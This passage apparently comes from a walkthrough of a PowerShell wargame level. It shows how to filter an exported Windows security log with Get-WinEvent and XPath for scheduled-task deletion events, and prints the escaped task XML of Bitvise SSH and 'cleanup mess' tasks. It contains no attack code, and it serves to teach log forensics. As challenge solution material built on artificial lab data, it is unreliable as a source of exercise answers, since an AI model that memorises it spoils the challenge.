$evt =\nAssigns the output of the command to a PowerShell variable named $evt. You can use $evt later to inspect or manipulate the filtered event data. Get-WinEvent -Path .\\security.evtx\nReads the security.evtx file from the current directory. This file contains exported Windows Security logs. FilterXPath \u0026quot;*[System[EventID=4699]]\u0026quot;\nFilters the logs using XPath, a powerful query language for selecting nodes in XML documents (Windows event logs are XML under the hood). the filter means look for any event (*) whose \u0026lt;System\u0026gt; block contains \u0026lt;EventID\u0026gt;4699. After assigning the output of the command to the $evt variable, we then display the message content of the event(s) stored in the variable as shown below.\n$evt.Message We shall then the most recent event from the variable $evt list, extract its Message text and slits that message into an array of lines, using the newline character as the separator as shown below.\n$evt[-1].Message.Split(\u0026#34;`n\u0026#34;) Below is the output of the commands above.\nPS C:\\users\\trebek1\\desktop\u0026gt; $evt = Get-WinEvent -Path .\\security.evtx -FilterXPath \u0026#34;*[System[EventID=4699]]\u0026#34; PS C:\\users\\trebek1\\desktop\u0026gt; $evt.Message A scheduled task was deleted. Subject: Security ID: S-1-5-21-3968311752-1263969649-23034729 66-500 Account Name: Administrator Account Domain: UNDERTHEWIRE Logon ID: 0x338C9 Task Information: Task Name: \\Bitvise\\Persistent BvSshServer Control Panel\\S-1-5-21-3968311752-1263969649-2303472966-500 Task Content: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02 /mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo /\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;LogonTrigger\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;/LogonTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveToken\u0026lt;/LogonType\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;Parallel\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;false\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;false\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;false\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;true\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;Duration\u0026gt;PT10M\u0026lt;/Duration\u0026gt; \u0026lt;WaitTimeout\u0026gt;PT1H\u0026lt;/WaitTimeout\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;true\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;false\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;false\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;false\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;WakeToRun\u0026gt;false\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT0S\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;6\u0026lt;/Priority\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;C:\\Program Files\\Bitvise SSH Server\\BssCtrl.exe\u0026lt;/Command \u0026gt; \u0026lt;Arguments\u0026gt;-startMinimized\u0026lt;/Arguments\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;/Task\u0026gt; A scheduled task was deleted. Subject: Security ID: S-1-5-21-3968311752-1263969649-23034729 66-500 Account Name: Administrator Account Domain: UNDERTHEWIRE Logon ID: 0x74703 Task Information: Task Name: \\Bitvise\\Persistent BvSshServer Control Panel\\S-1-5-21-3968311752-1263969649-2303472966-500 Task Content: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02 /mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo /\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;LogonTrigger\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;/LogonTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveToken\u0026lt;/LogonType\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;Parallel\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;false\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;false\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;false\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;true\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;Duration\u0026gt;PT10M\u0026lt;/Duration\u0026gt; \u0026lt;WaitTimeout\u0026gt;PT1H\u0026lt;/WaitTimeout\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;true\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;false\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;false\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;false\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;WakeToRun\u0026gt;false\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT0S\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;6\u0026lt;/Priority\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;C:\\Program Files\\Bitvise SSH Server\\BssCtrl.exe\u0026lt;/Command \u0026gt; \u0026lt;Arguments\u0026gt;-startMinimized\u0026lt;/Arguments\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;/Task\u0026gt; A scheduled task was deleted. Subject: Security ID: S-1-5-21-3968311752-1263969649-23034729 66-500 Account Name: Administrator Account Domain: UNDERTHEWIRE Logon ID: 0x13069DD Task Information: Task Name: \\Bitvise\\Persistent BvSshServer Control Panel\\S-1-5-21-3968311752-1263969649-2303472966-500 Task Content: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02 /mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo /\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;LogonTrigger\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;/LogonTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveToken\u0026lt;/LogonType\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;Parallel\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;false\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;false\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;false\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;true\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;Duration\u0026gt;PT10M\u0026lt;/Duration\u0026gt; \u0026lt;WaitTimeout\u0026gt;PT1H\u0026lt;/WaitTimeout\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;true\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;false\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;false\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;false\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;WakeToRun\u0026gt;false\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT0S\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;6\u0026lt;/Priority\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;C:\\Program Files\\Bitvise SSH Server\\BssCtrl.exe\u0026lt;/Command \u0026gt; \u0026lt;Arguments\u0026gt;-startMinimized\u0026lt;/Arguments\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;/Task\u0026gt; A scheduled task was deleted. Subject: Security ID: S-1-5-21-3968311752-1263969649-23034729 66-500 Account Name: Administrator Account Domain: UNDERTHEWIRE Logon ID: 0x12B5275 Task Information: Task Name: \\Bitvise\\Persistent BvSshServer Control Panel\\S-1-5-21-3968311752-1263969649-2303472966-500 Task Content: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02 /mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo /\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;LogonTrigger\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;/LogonTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveToken\u0026lt;/LogonType\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;Parallel\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;false\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;false\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;false\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;true\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;Duration\u0026gt;PT10M\u0026lt;/Duration\u0026gt; \u0026lt;WaitTimeout\u0026gt;PT1H\u0026lt;/WaitTimeout\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;true\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;false\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;false\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;false\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;WakeToRun\u0026gt;false\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT0S\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;6\u0026lt;/Priority\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;C:\\Program Files\\Bitvise SSH Server\\BssCtrl.exe\u0026lt;/Command \u0026gt; \u0026lt;Arguments\u0026gt;-startMinimized\u0026lt;/Arguments\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;/Task\u0026gt; A scheduled task was deleted. Subject: Security ID: S-1-5-21-3968311752-1263969649-23034729 66-500 Account Name: Administrator Account Domain: UNDERTHEWIRE Logon ID: 0x128CC45 Task Information: Task Name: \\Bitvise\\Persistent BvSshServer Control Panel\\S-1-5-21-3968311752-1263969649-2303472966-500 Task Content: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02 /mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo /\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;LogonTrigger\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;/LogonTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveToken\u0026lt;/LogonType\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;Parallel\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;false\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;false\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;false\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;true\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;Duration\u0026gt;PT10M\u0026lt;/Duration\u0026gt; \u0026lt;WaitTimeout\u0026gt;PT1H\u0026lt;/WaitTimeout\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;true\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;false\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;false\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;false\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;WakeToRun\u0026gt;false\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT0S\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;6\u0026lt;/Priority\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;C:\\Program Files\\Bitvise SSH Server\\BssCtrl.exe\u0026lt;/Command \u0026gt; \u0026lt;Arguments\u0026gt;-startMinimized\u0026lt;/Arguments\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;/Task\u0026gt; A scheduled task was deleted. Subject: Security ID: S-1-5-21-3968311752-1263969649-23034729 66-500 Account Name: Administrator Account Domain: UNDERTHEWIRE Logon ID: 0x12053FB Task Information: Task Name: \\Bitvise\\Persistent BvSshServer Control Panel\\S-1-5-21-3968311752-1263969649-2303472966-500 Task Content: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.2\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02 /mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo /\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;LogonTrigger\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;/LogonTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;RunLevel\u0026gt;HighestAvailable\u0026lt;/RunLevel\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\Administrator\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveToken\u0026lt;/LogonType\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;Parallel\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;false\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;false\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;false\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;true\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;Duration\u0026gt;PT10M\u0026lt;/Duration\u0026gt; \u0026lt;WaitTimeout\u0026gt;PT1H\u0026lt;/WaitTimeout\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;true\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;false\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;false\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;false\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;WakeToRun\u0026gt;false\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT0S\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;6\u0026lt;/Priority\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;C:\\Program Files\\Bitvise SSH Server\\BssCtrl.exe\u0026lt;/Command \u0026gt; \u0026lt;Arguments\u0026gt;-startMinimized\u0026lt;/Arguments\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;/Task\u0026gt; A scheduled task was deleted. Subject: Security ID: S-1-5-21-3968311752-1263969649-23034729 66-1135 Account Name: trebek1 Account Domain: UNDERTHEWIRE Logon ID: 0x644A01 Task Information: Task Name: \\cleanup mess Task Content: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.3\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02 /mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo /\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;CalendarTrigger\u0026gt; \u0026lt;StartBoundary\u0026gt;2017-05-10T01:00:00\u0026lt;/StartBoundary\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;RandomDelay\u0026gt;P0DT0H0M0S\u0026lt;/RandomDelay\u0026gt; \u0026lt;ScheduleByDay\u0026gt; \u0026lt;DaysInterval\u0026gt;1\u0026lt;/DaysInterval\u0026gt; \u0026lt;/ScheduleByDay\u0026gt; \u0026lt;/CalendarTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;IgnoreNew\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;true\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;true\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;true\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;false\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;Duration\u0026gt;PT10M\u0026lt;/Duration\u0026gt; \u0026lt;WaitTimeout\u0026gt;PT1H\u0026lt;/WaitTimeout\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;true\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;false\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;true\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;false\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;DisallowStartOnRemoteAppSession\u0026gt;false\u0026lt;/DisallowStartOnRemoteAppSes sion\u0026gt; \u0026lt;UseUnifiedSchedulingEngine\u0026gt;true\u0026lt;/UseUnifiedSchedulingEngine\u0026gt; \u0026lt;WakeToRun\u0026gt;false\u0026lt;/WakeToRun\u0026gt; \u0026lt;ExecutionTimeLimit\u0026gt;PT72H\u0026lt;/ExecutionTimeLimit\u0026gt; \u0026lt;Priority\u0026gt;7\u0026lt;/Priority\u0026gt; \u0026lt;/Settings\u0026gt; \u0026lt;Actions Context=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;Exec\u0026gt; \u0026lt;Command\u0026gt;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.ex e\u0026lt;/Command\u0026gt; \u0026lt;Arguments\u0026gt;-NonInteractive -NoLogo -NoProfile -File \u0026#39;c:\\users\\tre bek1\\mess_cleaner.ps1\u0026#39;\u0026lt;/Arguments\u0026gt; \u0026lt;/Exec\u0026gt; \u0026lt;/Actions\u0026gt; \u0026lt;Principals\u0026gt; \u0026lt;Principal id=\u0026#34;Author\u0026#34;\u0026gt; \u0026lt;UserId\u0026gt;UNDERTHEWIRE\\trebek1\u0026lt;/UserId\u0026gt; \u0026lt;LogonType\u0026gt;InteractiveToken\u0026lt;/LogonType\u0026gt; \u0026lt;RunLevel\u0026gt;LeastPrivilege\u0026lt;/RunLevel\u0026gt; \u0026lt;/Principal\u0026gt; \u0026lt;/Principals\u0026gt; \u0026lt;/Task\u0026gt; PS C:\\users\\trebek1\\desktop\u0026gt; $evt[-1].Message.Split(\u0026#34;`n\u0026#34;) A scheduled task was deleted. Subject: Security ID: S-1-5-21-3968311752-1263969649-23034729 66-1135 Account Name: trebek1 Account Domain: UNDERTHEWIRE Logon ID: 0x644A01 Task Information: Task Name: \\cleanup mess Task Content: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-16\u0026#34;?\u0026gt; \u0026lt;Task version=\u0026#34;1.3\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/windows/2004/02 /mit/task\u0026#34;\u0026gt; \u0026lt;RegistrationInfo /\u0026gt; \u0026lt;Triggers\u0026gt; \u0026lt;CalendarTrigger\u0026gt; \u0026lt;StartBoundary\u0026gt;2017-05-10T01:00:00\u0026lt;/StartBoundary\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;RandomDelay\u0026gt;P0DT0H0M0S\u0026lt;/RandomDelay\u0026gt; \u0026lt;ScheduleByDay\u0026gt; \u0026lt;DaysInterval\u0026gt;1\u0026lt;/DaysInterval\u0026gt; \u0026lt;/ScheduleByDay\u0026gt; \u0026lt;/CalendarTrigger\u0026gt; \u0026lt;/Triggers\u0026gt; \u0026lt;Settings\u0026gt; \u0026lt;MultipleInstancesPolicy\u0026gt;IgnoreNew\u0026lt;/MultipleInstancesPolicy\u0026gt; \u0026lt;DisallowStartIfOnBatteries\u0026gt;true\u0026lt;/DisallowStartIfOnBatteries\u0026gt; \u0026lt;StopIfGoingOnBatteries\u0026gt;true\u0026lt;/StopIfGoingOnBatteries\u0026gt; \u0026lt;AllowHardTerminate\u0026gt;true\u0026lt;/AllowHardTerminate\u0026gt; \u0026lt;StartWhenAvailable\u0026gt;false\u0026lt;/StartWhenAvailable\u0026gt; \u0026lt;RunOnlyIfNetworkAvailable\u0026gt;false\u0026lt;/RunOnlyIfNetworkAvailable\u0026gt; \u0026lt;IdleSettings\u0026gt; \u0026lt;Duration\u0026gt;PT10M\u0026lt;/Duration\u0026gt; \u0026lt;WaitTimeout\u0026gt;PT1H\u0026lt;/WaitTimeout\u0026gt; \u0026lt;StopOnIdleEnd\u0026gt;true\u0026lt;/StopOnIdleEnd\u0026gt; \u0026lt;RestartOnIdle\u0026gt;false\u0026lt;/RestartOnIdle\u0026gt; \u0026lt;/IdleSettings\u0026gt; \u0026lt;AllowStartOnDemand\u0026gt;true\u0026lt;/AllowStartOnDemand\u0026gt; \u0026lt;Enabled\u0026gt;true\u0026lt;/Enabled\u0026gt; \u0026lt;Hidden\u0026gt;false\u0026lt;/Hidden\u0026gt; \u0026lt;RunOnlyIfIdle\u0026gt;false\u0026lt;/RunOnlyIfIdle\u0026gt; \u0026lt;DisallowStartOnRemoteAppSession\u0026gt;false\u0026lt;/DisallowStartOnRemoteAppSes 